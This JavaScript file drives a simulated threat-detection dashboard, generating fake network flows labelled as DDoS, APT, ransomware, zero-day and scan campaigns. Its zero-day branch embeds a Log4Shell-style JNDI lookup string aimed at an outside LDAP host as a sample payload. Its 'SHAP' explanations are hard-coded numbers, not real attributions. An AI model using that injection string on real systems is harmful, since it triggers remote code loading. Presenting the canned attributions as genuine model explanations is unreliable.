/**
 * Cyber Threat Detection Pipeline & SHAP Explainable AI Engine
 * Generates synthetic/live network packet flows, evaluates anomaly scores,
 * and builds SHAP feature attribution breakdowns for each alert.
 */

class ThreatDetector {
    constructor() {
        this.flowCount = 0;
        this.anomalyCount = 0;
        this.activeCampaign = "normal"; // normal, apt, ddos, ransomware, zeroday, scan
        this.flowHistory = [];
        this.listeners = [];

        // Sample IP Pool
        this.internalIPs = ["192.168.1.105", "192.168.1.112", "192.168.1.140", "10.0.4.22", "10.0.4.88"];
        this.externalIPs = ["185.220.101.5", "45.142.214.8", "193.27.228.27", "89.248.165.74", "103.251.170.9"];
        this.targetPorts = [80, 443, 22, 3389, 8080, 5432, 27017];
    }

    setCampaign(campaignName) {
        this.activeCampaign = campaignName;
    }

    generatePacketFlow() {
        this.flowCount++;
        let isAnomaly = false;
        let threatType = "BENIGN Traffic";
        let severity = "normal";
        let srcIP = this.getRandomItem(this.externalIPs);
        let dstIP = this.getRandomItem(this.internalIPs);
        let dstPort = this.getRandomItem(this.targetPorts);
        let protocol = "TCP";
        let flowDuration = (Math.random() * 50 + 5).toFixed(2);
        let packetCount = Math.floor(Math.random() * 20 + 2);
        let byteRate = Math.floor(Math.random() * 5000 + 500);
        let entropy = parseFloat((Math.random() * 3 + 2).toFixed(2)); // Shannon entropy
        let tcpFlags = "SYN-ACK";
        let anomalyScore = parseFloat((Math.random() * 0.15).toFixed(4));
        let payloadSnippet = "GET /api/v1/health HTTP/1.1\\r\\nHost: sec.local";

        // Inject campaign anomalies
        const randTrigger = Math.random();
        if (this.activeCampaign === "ddos" || (this.activeCampaign === "normal" && randTrigger < 0.18)) {
            if (this.activeCampaign === "ddos" || randTrigger < 0.18) {
                isAnomaly = true;
                threatType = "DDoS SYN Volumetric Flood";
                severity = "critical";
                protocol = "TCP";
                dstPort = 80;
                packetCount = Math.floor(Math.random() * 5000 + 1000);
                byteRate = Math.floor(Math.random() * 800000 + 100000);
                tcpFlags = "SYN";
                entropy = 1.85;
                anomalyScore = parseFloat((0.92 + Math.random() * 0.07).toFixed(4));
                payloadSnippet = "\\x00\\x00\\x00\\x00 SYN FLOOD PACKET BURST";
            }
        } else if (this.activeCampaign === "apt" || (this.activeCampaign === "normal" && randTrigger < 0.25)) {
            isAnomaly = true;
            threatType = "APT38 Lateral C2 Beaconing";
            severity = "high";
            protocol = "HTTPS";
            dstPort = 443;
            entropy = parseFloat((7.85 + Math.random() * 0.1).toFixed(2)); // High entropy encrypted C2
            anomalyScore = parseFloat((0.88 + Math.random() * 0.08).toFixed(4));
            payloadSnippet = "POST /cdn-sys/sync.bin HTTP/1.1 [Encrypted Blob]";
        } else if (this.activeCampaign === "ransomware") {
            isAnomaly = true;
            threatType = "LockBit SMB Exfiltration Wave";
            severity = "critical";
            protocol = "SMB";
            dstPort = 445;
            packetCount = Math.floor(Math.random() * 1200 + 300);
            byteRate = Math.floor(Math.random() * 400000 + 80000);
            entropy = 7.96;
            anomalyScore = parseFloat((0.95 + Math.random() * 0.04).toFixed(4));
            payloadSnippet = "\\\\ADMIN$\\C$\\LockBit_Note.txt [Encr Payload]";
        } else if (this.activeCampaign === "zeroday") {
            isAnomaly = true;
            threatType = "Zero-Day Remote Code Execution (RCE)";
            severity = "critical";
            protocol = "HTTP";
            dstPort = 8080;
            entropy = 6.42;
            anomalyScore = parseFloat((0.98 + Math.random() * 0.01).toFixed(4));
            payloadSnippet = "${jndi:ldap://185.220.101.5:1389/ExploitPayload}";
        } else if (this.activeCampaign === "scan") {
            isAnomaly = true;
            threatType = "Stealth SYN Port Reconnaissance";
            severity = "medium";
            protocol = "TCP";
            dstPort = Math.floor(Math.random() * 65000 + 1);
            packetCount = 1;
            tcpFlags = "SYN";
            anomalyScore = parseFloat((0.65 + Math.random() * 0.15).toFixed(4));
            payloadSnippet = "[TCP NULL / Xmas Port Probe]";
        }

        if (isAnomaly) {
            this.anomalyCount++;
        }

        // Calculate SHAP feature attribution breakdown
        const shap = this.calculateSHAP(isAnomaly, entropy, packetCount, byteRate, tcpFlags);

        const flowRecord = {
            id: `FLW-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
            timestamp: new Date().toLocaleTimeString(),
            srcIP,
            dstIP,
            dstPort,
            protocol,
            flowDuration,
            packetCount,
            byteRate,
            entropy,
            tcpFlags,
            isAnomaly,
            threatType,
            severity,
            anomalyScore,
            payloadSnippet,
            shap
        };

        this.flowHistory.unshift(flowRecord);
        if (this.flowHistory.length > 200) {
            this.flowHistory.pop();
        }

        this.notifyListeners(flowRecord);
        return flowRecord;
    }

    calculateSHAP(isAnomaly, entropy, packetCount, byteRate, tcpFlags) {
        if (!isAnomaly) {
            return [
                { feature: "Payload Entropy", value: (Math.random() * 0.05).toFixed(3), color: "#00ff66" },
                { feature: "Packet Volumetric Rate", value: (Math.random() * 0.04).toFixed(3), color: "#00ff66" },
                { feature: "TCP Flag Ratio", value: (Math.random() * 0.03).toFixed(3), color: "#00ff66" },
                { feature: "Inter-Arrival Time (IAT)", value: (Math.random() * 0.02).toFixed(3), color: "#00ff66" }
            ];
        }

        // High contribution features for anomalies
        let entropyShap = entropy > 6.0 ? "+0.42" : "+0.12";
        let packetShap = packetCount > 500 ? "+0.38" : "+0.15";
        let byteRateShap = byteRate > 50000 ? "+0.35" : "+0.10";
        let tcpShap = tcpFlags === "SYN" ? "+0.28" : "+0.08";

        return [
            { feature: "Payload Shannon Entropy", value: entropyShap, color: "#ff2a55" },
            { feature: "Packet Volumetric Rate", value: packetShap, color: "#ff9900" },
            { feature: "Byte Transfer Rate", value: byteRateShap, color: "#ff2a55" },
            { feature: "TCP Flags Anomalous Ratio", value: tcpShap, color: "#ffcc00" }
        ];
    }

    getRandomItem(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }

    subscribe(callback) {
        this.listeners.push(callback);
    }

    notifyListeners(flowRecord) {
        this.listeners.forEach(fn => fn(flowRecord));
    }
}

window.threatDetector = new ThreatDetector();
